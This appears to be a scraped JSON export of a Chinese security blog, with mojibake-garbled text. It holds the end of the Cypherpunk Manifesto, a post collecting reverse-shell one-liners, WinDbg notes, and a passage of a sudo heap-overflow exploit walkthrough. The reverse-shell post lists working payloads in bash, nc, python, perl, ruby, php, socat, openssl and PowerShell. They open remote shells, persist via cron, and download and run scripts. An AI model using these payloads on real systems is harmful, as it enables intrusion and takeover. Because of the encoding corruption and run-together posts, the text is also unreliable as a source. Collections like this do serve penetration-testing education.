whole globe, and with it the anonymous transactions systems that it makes possible. For privacy to be widespread it must be part of a social contract. People must come and together deploy these systems for the common good. Privacy only extends so far as the cooperation of oneâ€™s fellows in society. We the Cypherpunks seek your questions and your concerns and hope we may engage you so that we do not deceive ourselves. We will not, however, be moved out of our course because some may disagree with our goals. The Cypherpunks are actively engaged in making the networks safer for privacy. Let us proceed together apace. Onward. Eric Hughes 9 March 1993","categories":[{"name":"misc","slug":"misc","permalink":"https://joe1sn.eu.org/categories/misc/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://joe1sn.eu.org/tags/misc/"},{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"}]},{"title":"å¸¸è§„åå¼¹shellåˆé›†","slug":"reverse-shell","date":"2022-07-29T11:18:41.000Z","updated":"2023-06-01T14:26:19.370Z","comments":true,"path":"2022/07/29/reverse-shell/","link":"","permalink":"https://joe1sn.eu.org/2022/07/29/reverse-shell/","excerpt":"åå¼¹shellçš„å¸¸è§æ–¹å¼","text":"åå¼¹shellçš„å¸¸è§æ–¹å¼ åå¼¹Shell-Linux 12345678ã€ç›‘å¬ç«¯ã€‘centos: 192.168.35.152ã€è¢«æ§ç«¯ã€‘kali: 192.168.35.128 # ç›‘å¬ç«¯æ‰§è¡Œ[root@localhost ~]# nc -vvl 7777Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::7777Ncat: Listening on 0.0.0.0:7777 bash 123â”Œâ”€â”€(root@kali)-[/home/kali]â””â”€# bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1 # æ‰§è¡Œå¤±è´¥ zsh: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•: /dev/tcp/192.168.35.152/7777 0.tcp.ngrok.io:15122 bash -i &gt;&amp; /dev/tcp/0.tcp.ngrok.io/15122 0&gt;&amp;1 bash base64 12# /bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1bash -c &#x27;&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzUuMTUyLzc3NzcgMD4mMSAgIA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27; bash base64 URLencode 12# /bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1bash -c &#x27;&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzUuMTUyLzc3NzcgMD4mMSAgIA%3D%3D&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27; nc 123nc -e /bin/bash 192.168.35.152 7777mknod backpipe p &amp;&amp; nc 192.168.35.152 7777 0&lt;backpipe | /bin/bash 1&gt;backpipe rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.35.152 7777 &gt;/tmp/f ncat 12ncat 192.168.35.152 7777 -e /bin/bashncat --udp 192.168.35.152 7777 -e /bin/bash curl 123456# kaliå¼€å¯httpæœåŠ¡ï¼ŒæŠŠbashå‘½ä»¤å†™å…¥htmlæ–‡ä»¶cat bash.html/bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1# centoscurl 192.168.35.152/bash.html|bash http æ”»å‡»æ–¹ï¼š 1234# ç¼–å†™shellè„šæœ¬å¹¶å¯åŠ¨httpæœåŠ¡å™¨echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1&quot; &gt; shell.shpython2ç¯å¢ƒä¸‹ï¼špython -m SimpleHTTPServer 80python3ç¯å¢ƒä¸‹ï¼špython -m http.server 80 è¢«æ§ç«¯ï¼š 1234# ä¸Šä¼ shell.shæ–‡ä»¶wget 192.168.35.152/shell.sh# æ‰§è¡Œshell.shæ–‡ä»¶bash shell.sh crontab 1* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1 whois 12# åªèƒ½æ‰§è¡ŒæŒ‡å®šå‘½ä»¤ï¼Œå¦‚pwdå‘½ä»¤whois -h 192.168.35.152 -p 7777 `pwd` python 1python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.35.152&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; php 1php -r &#x27;$sock=fsockopen(&quot;192.168.35.152&quot;,7777);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; ruby 12ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;192.168.35.152&quot;,7777).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27; # æ‰§è¡Œå¤±è´¥ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;192.168.35.152&quot;,&quot;7777&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27; socat 1socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.35.152:7777 perl 1perl -e &#x27;use Socket;$i=&quot;192.168.35.152&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27; php 1php -r &#x27;$sock=fsockopen(&quot;192.168.35.152&quot;,7777);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; openssl 12345678# ç›‘å¬ç«¯openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodesopenssl s_server -quiet -key key.pem -cert cert.pem -port 7777# orncat --ssl -vv -l -p 7777# å—æ§ç«¯mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.35.152:7777 &gt; /tmp/s; rm /tmp/s åå¼¹Shell-Windows Windowsä¸‹çš„åå¼¹shellä»…æµ‹è¯•äº†ncï¼Œæ‰§è¡ŒæˆåŠŸã€‚ 12345678ã€ç›‘å¬ç«¯ã€‘centos: 192.168.35.152ã€è¢«æ§ç«¯ã€‘windows: 192.168.35.1 # ç›‘å¬ç«¯æ‰§è¡Œ[root@localhost ~]# nc -vvl 7777Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::7777Ncat: Listening on 0.0.0.0:7777 powercat é¡¹ç›®åœ°å€ï¼šhttps://github.com/besimorhino/powercat 1System.Net.Webclient.DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);powercat -c 192.168.35.152 -p 7777 -e cmd nc 1nc 192.168.35.152 7777 -e c:\\windows\\system32\\cmd.exe nishang Nishangæ˜¯ä¸€ä¸ªåŸºäºPowerShellçš„æ”»å‡»æ¡†æ¶ï¼Œæ•´åˆäº†ä¸€äº›PowerShellæ”»å‡»è„šæœ¬å’Œæœ‰æ•ˆè½½è·ï¼Œå¯åå¼¹TCP/ UDP/ HTTP/HTTPS/ ICMPç­‰ç±»å‹shellã€‚ é¡¹ç›®åœ°å€ï¼šhttps://github.com/samratashok/nishang 12# å°†nishangä¸‹è½½åˆ°æ”»å‡»è€…æœ¬åœ°ï¼Œåœ¨ç›®æ ‡æœºä½¿ç”¨powershellæ‰§è¡Œä»¥ä¸‹å‘½ä»¤IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.35.152 -port 7777 Reverse UDP shell 123IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.35.152/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;);Invoke-PowerShellUdp -Reverse -IPAddress 192.168.35.152 -port 7777 MSF 12345# æ‰¾å‡ºå„ç±»åå¼¹ä¸€å¥è¯payloadçš„è·¯å¾„ä¿¡æ¯msfvenom -l payloads | grep &#x27;cmd/windows/reverse&#x27;# ç”Ÿæˆåå¼¹shellï¼Œå¤åˆ¶ç²˜è´´åˆ°é¶æœºä¸Šè¿è¡Œmsfvenom -p cmd/windows/reverse_powershell LHOST=192.168.35.152 LPORT=7777","categories":[{"name":"pentest","slug":"pentest","permalink":"https://joe1sn.eu.org/categories/pentest/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://joe1sn.eu.org/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"windbgè°ƒè¯•å…¥é—¨ç¬”è®°","slug":"windbg-note","date":"2022-06-10T03:52:56.000Z","updated":"2023-06-01T14:26:48.239Z","comments":true,"path":"2022/06/10/windbg-note/","link":"","permalink":"https://joe1sn.eu.org/2022/06/10/windbg-note/","excerpt":"å‡†å¤‡ç‚¹windowsåŸºç¡€åŠŸ","text":"å‡†å¤‡ç‚¹windowsåŸºç¡€åŠŸ å®‰è£…ä¸é…ç½® 1.ç‰ˆæœ¬ WinDbgä¸€èˆ¬åˆ†ä¸ºx86å’Œx64ï¼Œå…·ä½“ç”±è°ƒè¯•oså¹³å°(Host)å’Œè¢«è°ƒè¯•ç¨‹åºç±»å‹å†³å®š x86-based Host Computer x86å¤„ç†å™¨å¹³å°ä¸Šè°ƒè¯•æ‰€æœ‰ç¨‹åºéƒ½ä½¿ç”¨è¯¥ç‰ˆæœ¬ x64-based Host Computer åˆ†æDUMPæ–‡ä»¶ï¼šè‹¥æ–‡ä»¶æ˜¯åœ¨windows XPåŠæ›´æ–°çš„ç‰ˆæœ¬ç”Ÿæˆçš„ï¼Œåˆ™ä¸¤è€…éƒ½å¯ï¼›è‹¥Windows2000åŠæ›´æ—©çš„ç‰ˆæœ¬å°±åªèƒ½ä½¿ç”¨x86ç‰ˆæœ¬çš„WinDbg åŒæœºè°ƒè¯• å¯¹äºWindowsXPåŠå…¶æ›´æ–°çš„ç³»ç»Ÿwindbgä¼šè‡ªåŠ¨é€‚åº”ï¼Œæ›´è€çš„åªèƒ½ä½¿ç”¨x86ç‰ˆæœ¬ ç”¨æˆ·æ€ x64ç‰ˆæœ¬ç¨‹åºåªèƒ½ä½¿ç”¨x64ç‰ˆæœ¬ï¼Œx86ç‰ˆæœ¬ç¨‹åºåˆ™æ˜¯ä¸¤è€…çš†å¯ 2.å·¥ä½œç©ºé—´ â€‹ æ¯è°ƒè¯•ä¸€ä¸ªç¨‹åºï¼Œä¼šæ¶‰åŠåˆ°è¦ä½¿ç”¨çš„å‚æ•°ã€é…ç½®ç­‰ä¿¡æ¯ï¼ŒWinDBGä¼šä½¿ç”¨Workspaceæ¥ä¿å­˜è¿™äº›ä¿¡æ¯ï¼Œå¯ä»¥ç†è§£ä¸ºé¡¹ç›®æ–‡ä»¶ â€‹ 3.è°ƒè¯•ç¬¦å· â€‹ æœ€ç»å…¸çš„å°±æ˜¯ä½¿ç”¨IDAåæ±‡ç¼–çš„æ—¶å€™ï¼Œå¦‚æœæ–‡ä»¶æ²¡æœ‰è°ƒè¯•ç¬¦å·ä¿¡æ¯ï¼Œé‚£ä¹ˆå‡½æ•°å°±ä¼šè¢«å‘½åä¸ºsub_startaddrè¿™æ ·ã€‚æ‰€ä»¥åœ¨è°ƒè¯•çš„æ—¶å€™è¿™äº›ä¿¡æ¯ä¼šå¤§å¤§å¸®åŠ©æˆ‘ä»¬ç†è§£ç¨‹åº â€‹ windowsçš„å°±æ˜¯PDBæ–‡ä»¶ï¼Œ WinDBGå…è®¸ç”¨æˆ·æŒ‡å®šä¸€ä¸ªæˆ–è€…å¤šä¸ªç›®å½•å­˜æ”¾ç¬¦å·æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ç¯å¢ƒå˜é‡_NT_SYMBOL_PATHæŒ‡å‘ç›®å½•ï¼Œæœ€å¸¸ç”¨çš„æ˜¯ä»å¾®è½¯çš„ç¬¦å·æœåŠ¡å™¨ä¸‹è½½(IDAä¼šé»˜è®¤åŠ è½½ï¼Œå¹¶ä¸”è®¾ç½®äº†å…¨å±€å˜é‡ä¸ºç¬¦å·æœåŠ¡å™¨çš„è¯æ¯æ¬¡vsç¼–è¯‘éƒ½ä¼šä»æœåŠ¡å™¨æ‹‰ï¼Œç‰¹åˆ«æ…¢)ï¼Œå…·ä½“é…ç½®ç™¾åº¦ ç›¸å…³æŒ‡ä»¤ ldï¼šè‡ªåŠ¨ä»ç¬¦å·æ–‡ä»¶ç›®å½•æˆ–è€…ç¬¦å·æœåŠ¡å™¨åŠ è½½ç¬¦å·æ–‡ä»¶ ä½¿ç”¨ lm æŸ¥çœ‹æ¨¡å— ç¬¦å·çš„è¡¨è¾¾ï¼šæ¨¡å—å!å‡½æ•°åï¼Œ å¦‚kernel32æ¨¡å—çš„OpenProcesså‡½æ•°ï¼škernel32!OpenProcess å†…æ ¸ä¸åŒï¼Œæ¯”å¦‚ ntdll!NtOpenProcess å’Œ nt!NtOpenProcess åˆ†åˆ«è¡¨ç¤ºntdllä¸­çš„NtOpenProcesså‡½æ•° å’Œ å†…æ ¸æ¨¡å—ä¸­çš„NtOpenProcesså‡½æ•° ç¬¦å·æ£€ç´¢ï¼šx [é€‰é¡¹] Module!Symbol ç¬¦å·åå¯ä»¥ä½¿ç”¨? * [] # +è¿›è¡Œæ¨¡ç³ŠåŒ¹é… æºç çº§åˆ«è°ƒè¯• éœ€è¦æºæ–‡ä»¶äºWinDBGåœ¨åŒä¸€ç³»ç»Ÿä¸­ï¼Œä½¿ç”¨ctrl+Pï¼ŒæŒ‡å®šæºä»£ç è·¯å¾„å°±è¡Œäº†ï¼Œå¤šä¸ªè·¯å¾„ä½¿ç”¨;åˆ†éš” ä½¿ç”¨ctrl+Oé€‰æ‹©æºä»£ç æ–‡ä»¶ï¼Œåœ¨æºä»£ç æ–‡ä»¶ä¸­F9æ·»åŠ æ–­ç‚¹ è°ƒè¯•è¿‡ç¨‹ 1.å¼€å§‹è°ƒè¯• åæ±‡ç¼–ä»£ç é»˜è®¤åœç•™åœ¨ntdllä¸­çš„ç³»ç»Ÿæ–­ç‚¹ï¼Œä½¿ç”¨g @$exentryè·³è½¬å¸¦å‡½æ•°å…¥å£ 2.æ§åˆ¶ç›®æ ‡ç¨‹åºæ‰§è¡Œ ä¼ªå¯„å­˜å™¨@$raè¡¨ç¤ºå½“å‰å‡½æ•°è¿”å›åœ°å€ï¼Œé‚£ä¹ˆpa @$raåˆ™è¡¨ç¤ºè·³å‡ºå½“å‰å‡½æ•° æ–­ç‚¹å‘½ä»¤ 1.å¯¹äºint 3 åˆ†åˆ«æ˜¯bp bu bm bp[ID] [é€‰é¡¹] [åœ°å€orç¬¦å·[è¦å¿½ç•¥çš„ä¸­æ–­æ¬¡æ•°]] [ä¸­æ–­æ—¶æ‰§è¡Œçš„å‘½ä»¤] é€‰é¡¹ï¼š/l ä¸€æ¬¡æ€§æ–­ç‚¹ï¼›/cæœ€å¤§è°ƒç”¨æ·±åº¦ï¼›/Cæœ€å°è°ƒç”¨æ·±åº¦ bu kernel32!GetVersionï¼šå¯¹ç¬¦å·ä¸‹æ–­ç‚¹ bu kernel32!GetVersio*ï¼šå¯¹åŒ…å«é€šé…ç¬¦ä¸‹æ–­ç‚¹ 2.ç¡¬ä»¶æ–­ç‚¹ ba[ID] è®¿é—®æ–¹å¼ è®¿é—®é•¿åº¦ [é€‰é¡¹] [æ–­ç‚¹åœ°å€orç¬¦å·[å¿½ç•¥ä¸­æ–­æ¬¡æ•°]] [ç»ˆç«¯æ‰§è¡ŒæŒ‡ä»¤] è®¿é—®æ–¹å¼ eï¼šè¯»å–æˆ–æ‰§è¡Œæ—¶è§¦å‘ rï¼šè¯»å–æ—¶è§¦å‘ wï¼šå†™å…¥æ—¶è§¦å‘ iï¼šåœ¨æ‰§è¡Œè¾“å…¥è¾“å‡ºæ—¶è§¦å‘ 3.æ¡ä»¶æ–­ç‚¹ å»ºè®®ç”¨åˆ°çš„æ—¶å€™ç™¾åº¦ 4.ç®¡ç†æ–­ç‚¹ blï¼šåˆ—å‡ºæ‰€æœ‰æ–­ç‚¹ bc bd beï¼šåˆ é™¤ ç¦æ­¢ å¯ç”¨æ–­ç‚¹ æ ˆçª—å£ 123456780:000:x86&gt; k # ChildEBP RetAddr00 0019ff3c 0040112e esp+0x115e01 0019ff54 00401097 esp+0x112e02 0019ff64 00401009 esp+0x109703 0019ff80 77037a7e esp+0x100904 0019ffdc 77037a4e ntdll_76fd0000!__RtlUserThreadStart+0x2f05 0019ffec 00000000 ntdll_76fd0000!_RtlUserThreadStart+0x1b æ¯ä¸€è¡Œéƒ½æ˜¯å½“å‰çº¿ç¨‹çš„ä¸€ä¸ªæ ˆå¸§ï¼Œ00~05æ˜¯ç«™çš„è°ƒç”¨é“¾ï¼Œä»å½“å‰åˆ°é¡¶å±‚ã€‚ ç¬¬ä¸€åˆ—æ˜¯åŸºåœ°å€(ChildEBP)ï¼›ç¬¬äºŒåˆ—æ˜¯è¿”å›åœ°å€ï¼›ç¬¬ä¸‰åˆ—æ˜¯å‡½æ•°çš„æ‰§è¡Œåœ°å€ 123456780:000:x86&gt; kb # ChildEBP RetAddr Args to Child 00 0019ff3c 0040112e 00000008 00000007 00000006 esp+0x115e01 0019ff54 00401097 00000004 00000003 0019ff80 esp+0x112e02 0019ff64 00401009 00000002 00000001 7681fa29 esp+0x109703 0019ff80 77037a7e 002f5000 f602b8bf 00000000 esp+0x100904 0019ffdc 77037a4e ffffffff 77058a01 00000000 ntdll_76fd0000!__RtlUserThreadStart+0x2f05 0019ffec 00000000 00401000 002f5000 00000000 ntdll_76fd0000!_RtlUserThreadStart+0x1b kbä¼šæ˜¾ç¤ºæ ˆä¸Šé¢çš„å‰3ä¸ªå‚æ•° kp ï¼šå‚æ•°å’Œå‚æ•°å€¼æŒ‰å‡½æ•°åŸå‹æ˜¾ç¤º kvï¼šç›¸å¯¹äºkpå¢åŠ å¸§æŒ‡é’ˆçœç•¥ä¿¡æ¯å’Œè°ƒç”¨çº¦å®šæ˜¾ç¤º kdï¼šåˆ—å‡ºæ ˆä¸­çš„æ•°æ® å†…å­˜å‘½ä»¤ 1.æŸ¥çœ‹å†…å­˜ d[ç±»å‹] [åœ°å€èŒƒå›´] dwï¼šDWORD ddï¼š4å­—èŠ‚DWORD dpï¼š8å­—èŠ‚ dfï¼š4å­—èŠ‚å•ç²¾åº¦æµ®ç‚¹ dpï¼šæŒ‡é’ˆå¤§å°æ ¼å¼ daï¼šASCIIå­—ç¬¦ä¸² dbï¼šå­—èŠ‚å’ŒASCIIå­—ç¬¦ä¸² dsï¼šANSI_STRING dt [æ¨¡å—å!]ç±»å‹åï¼šæ˜¾ç¤ºæ•°æ®ç±»å‹å’Œæ•°æ®ç»“æ„ 2.æœç´¢å†…å­˜ s - [type] range pattern typeï¼šæœç´¢çš„æ•°æ®ç±»å‹ï¼šb(byte) w(word) d(dword) a(ASCII) u(Unicode) rangeï¼š èµ·å§‹åœ°å€ä¸ç»ˆæ­¢åœ°å€ s -a 0x4000000 0x4030000 &quot;test&quot; èµ·å§‹åœ°å€å’Œæœç´¢é•¿åº¦ s -a 0x0000000 L?0x7fffffff &quot;mytest&quot; 3.ä¿®æ”¹å†…å­˜ e &#123;a|u|za|zu&#125; address &quot;String&quot; e &#123;a|b|d|D|f|q|u|w&#125; address [value] 4.è§‚å¯Ÿå†…å­˜å±æ€§ !address [Address] è„šæœ¬ winDBGå¯ä»¥åƒpythonä¸€æ ·è§£é‡Šæ‰§è¡Œè„šæœ¬ä¸­çš„è¯­è¨€ 1.ä¼ªå¯„å­˜å™¨ @$exentryï¼šå½“å‰è¿›ç¨‹çš„å…¥å£ï¼Œg @$exentryå¯ä»¥ç›´è¾¾å…¥å£ $ipï¼šæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ $raï¼šå½“å‰å‡½æ•°è¿”å›åœ°å€ $retregï¼šå‡½æ•°è¿”å›å€¼ $cspï¼šå½“å‰æ ˆæŒ‡é’ˆ(current stack pointer) å…¶ä½™å»ºè®®ç™¾åº¦ è°ƒè¯•æ‹“å±•åŠŸèƒ½ ç±»ä¼¼äºæ’ä»¶çš„åŠ è½½ å¼€å‘çš„è¯å¯ä»¥å‚è€ƒWinDbgæä¾›çš„sdkï¼ˆåœ¨å®‰è£…æ–‡ä»¶å¤¹ä¸‹å°±æœ‰ï¼‰","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"dbg","slug":"dbg","permalink":"https://joe1sn.eu.org/tags/dbg/"},{"name":"Windows","slug":"Windows","permalink":"https://joe1sn.eu.org/tags/Windows/"}]},{"title":"SUDOå †æº¢å‡ºææƒï¼šä»fuzzåˆ°exp [3]","slug":"sudo-fuzz2exp-3","date":"2022-04-13T23:40:53.000Z","updated":"2023-06-01T14:24:18.025Z","comments":true,"path":"2022/04/14/sudo-fuzz2exp-3/","link":"","permalink":"https://joe1sn.eu.org/2022/04/14/sudo-fuzz2exp-3/","excerpt":"å‰æ–‡ï¼šhttps://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ å—åˆ°youtuberï¼šLiveOverflowçš„ç³»åˆ—æ•™ç¨‹çš„å¯å‘ï¼Œæˆ‘å‘ç°åœ¨ä¸­æ–‡äº’è”ç½‘ä¸Šå¹¶æ²¡æœ‰ç›¸å…³çš„ç¿»è¯‘æ•™ç¨‹ï¼Œæ‰€ä»¥æˆ‘æƒ³ä»¥å®éªŒæŠ¥å‘Šçš„å½¢å¼æ¥åˆ›é€ è¿™ä¸ªä»fuzzåˆ°expçš„ç³»åˆ—å›¾æ–‡æ•™ç¨‹ åŸå§‹è§†é¢‘åˆé›†ï¼šhttps://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx åŸå§‹Blogï¼šhttps://liveoverflow.com/why-pick-sudo-research-target-part-1/ åŸä½œè€…ä»£ç ä»“åº“ï¼šhttps://github.com/LiveOverflow/pwnedit","text":"å‰æ–‡ï¼šhttps://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ å—åˆ°youtuberï¼šLiveOverflowçš„ç³»åˆ—æ•™ç¨‹çš„å¯å‘ï¼Œæˆ‘å‘ç°åœ¨ä¸­æ–‡äº’è”ç½‘ä¸Šå¹¶æ²¡æœ‰ç›¸å…³çš„ç¿»è¯‘æ•™ç¨‹ï¼Œæ‰€ä»¥æˆ‘æƒ³ä»¥å®éªŒæŠ¥å‘Šçš„å½¢å¼æ¥åˆ›é€ è¿™ä¸ªä»fuzzåˆ°expçš„ç³»åˆ—å›¾æ–‡æ•™ç¨‹ åŸå§‹è§†é¢‘åˆé›†ï¼šhttps://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx åŸå§‹Blogï¼šhttps://liveoverflow.com/why-pick-sudo-research-target-part-1/ åŸä½œè€…ä»£ç ä»“åº“ï¼šhttps://github.com/LiveOverflow/pwnedit My previous blog: https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ I was inspired by the LiveOverflowâ€™s Sudo Vulnerability Walkthrough on youtube, but i found thereâ€™s no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this â€œfrom fuzz to exploitâ€ series. Original Videos: https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx Original Blog: https://liveoverflow.com/why-pick-sudo-research-target-part-1/ Source Project Code: https://github.com/LiveOverflow/pwnedit æœ¬èŠ‚å†…å®¹ï¼š Discussing Heap Exploit Strategies for sudo - Ep. 09 Developing a Tool to Find Function Pointers on The Heap | Ep. 10 Fuzzing Heap Layout to Overflow Function Pointers | Ep. 11 Developing GDB Extension for Heap Exploitation | Ep. 12 ç¼–å†™expæ€è·¯ å¯¹äºCTFä¸­å¸¸è§çš„å †æ€è·¯æ˜¯é€šè¿‡å †åˆ†é…ç®—æ³•ï¼Œä½¿ç”¨freeã€mallocè¿›è¡Œexpçš„ç¼–å†™ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¼šå‡ºç°ä¸€äº›èœå•è®©ä½ ä½¿ç”¨è¿™äº›åŠŸèƒ½ã€‚æœ¬è´¨ä¸Šæ˜¯æ”»å‡»å †åˆ†é…ç®—æ³• ä½†æ˜¯åœ¨æ¼æ´åˆ©ç”¨ä¸­ï¼Œåªå­˜åœ¨è¿™ä¸€ä¸ªå †æº¢å‡ºï¼Œæˆ‘ä»¬æ— æ³•è¿›è¡Œç³»åˆ—çš„freeã€mallocï¼Œæ‰€ä»¥æ€è·¯æ˜¯èƒ½å¦æ”»å‡»å †å†…çš„æœ‰æ•ˆæ•°æ®ï¼Œå°è¯•æ‰¾åˆ°å †å†…çš„å‡½æ•°æŒ‡é’ˆæˆ–è€…å…¶ä»–æœ‰ç”¨çš„æ•°æ®ã€‚æœ¬è´¨ä¸Šæ˜¯æ”»å‡»å †ä¸Šçš„æ•°æ® GDBè°ƒè¯• ä¸é€‚ç”¨asané‡æ–°ç¼–è¯‘åï¼Œä½¿ç”¨GEFåˆ†æcrashæ—¶å †çš„åˆ†å¸ƒ ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„å †æº¢å‡ºï¼Œå†çœ‹çœ‹å‡ºå‘æ—¶çš„å †åˆ†å¸ƒ æ–­ç‚¹ å †chunk å†æ¬¡åˆ°è¾¾æ–­ç‚¹ï¼Œå †æº¢å‡º å›°éš¾ä¸è§£å†³ è¿™æ ·çš„å †åˆ†é…æƒ…å†µè®©æˆ‘ä»¬å¾ˆéš¾ä½¿ç”¨å †é£æ°´å»è°ƒæ•´å †åˆ†é…ï¼Œå¹¶ä¸”åœ¨ç¨‹åºè¿è¡Œä¸­ä¼šé‡åˆ°å„ç§ä½•æ ·çš„å†…å­˜åˆ†é…æƒ…å†µï¼Œå“ªæ€•æ˜¯ä¸ä¸€æ ·çš„é•¿åº¦éƒ½ä¼šé€ æˆå †åˆ†é…çš„ä¸åŒï¼Œè¿›è€Œè®©æ•°æ®åˆ†é…åˆ°ä¸åŒçš„åœ°æ–¹ã€‚ å¦‚ä½•è§£å†³ï¼Œæœ‰ä¸¤ä¸ªæ€è·¯ ä½œè€…æ”¶åˆ°äº†åŸæ–‡æŠ¥å‘Šçš„å¯å‘ï¼Œå°è¯•ç¼–å†™å°å·¥å…·å»â€œæ§åˆ¶â€å † To implement this initial technique, we wrote a rudimentary brute-forcer that executes Sudo inside gdb, overflows the â€œuser_argsâ€ buffer, and randomly selects the following parameters: é€šè¿‡è¦†å†™å…¶ä»–å †ä¸­çš„å‡½æ•°æŒ‡é’ˆæ¥å®ç°rceæˆ–è€…ææƒ å‡½æ•°æŒ‡é’ˆå·¥å…·ç¼–å†™ æ€è·¯åˆ†æ ä»gdbçš„vmmapæŒ‡ä»¤æˆ‘ä»¬çŸ¥é“ç¨‹åºæœ‰å“ªäº›ä»£ç æ®µ å¦‚æœåœ¨å †å†…å­˜ä¸­å¸¦æœ‰xå³å¯æ‰§è¡Œæƒé™çš„è¯å°±å¯èƒ½å­˜åœ¨èƒ½å¤Ÿè¢«æˆ‘ä»¬åˆ©ç”¨çš„å‡½æ•°æŒ‡é’ˆ å·¥å…·ç¼–å†™ å†™å…¥ä½†æ˜¯æ²¡æœ‰æº¢å‡ºçš„æƒ…å†µä¸‹ï¼Œåœ¨æ¼æ´å‡½æ•°æ–­ç‚¹ï¼Œdumpå†…å­˜ 1dump binary memory /pwd/heap 0x005555555f9000 0x00555555637000 å¤åˆ¶vmmapç»“æœï¼Œå°è¯•åˆ†æå‡ºæœ‰å¯æ‰§è¡Œæƒé™çš„å†…å­˜åœ°å€ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354550x00555555554000 0x0055555555b000 0x00000000000000 r-- /pwd/sudo_test/src/sudo0x0055555555b000 0x005555555d6000 0x00000000007000 r-x /pwd/sudo_test/src/sudo0x005555555d6000 0x005555555f4000 0x00000000082000 r-- /pwd/sudo_test/src/sudo0x005555555f4000 0x005555555f5000 0x0000000009f000 r-- /pwd/sudo_test/src/sudo0x005555555f5000 0x005555555f9000 0x000000000a0000 rw- /pwd/sudo_test/src/sudo0x005555555f9000 0x00555555637000 0x00000000000000 rw- [heap]0x007ffff7cc1000 0x007ffff7d02000 0x00000000000000 rw-0x007ffff7d02000 0x007ffff7d05000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d05000 0x007ffff7d0c000 0x00000000003000 r-x /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0c000 0x007ffff7d0e000 0x0000000000a000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0e000 0x007ffff7d0f000 0x0000000000b000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0f000 0x007ffff7d10000 0x0000000000c000 rw- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d10000 0x007ffff7d16000 0x00000000000000 rw-0x007ffff7d16000 0x007ffff7d1d000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache0x007ffff7d1d000 0x007ffff7d4f000 0x00000000000000 r-- 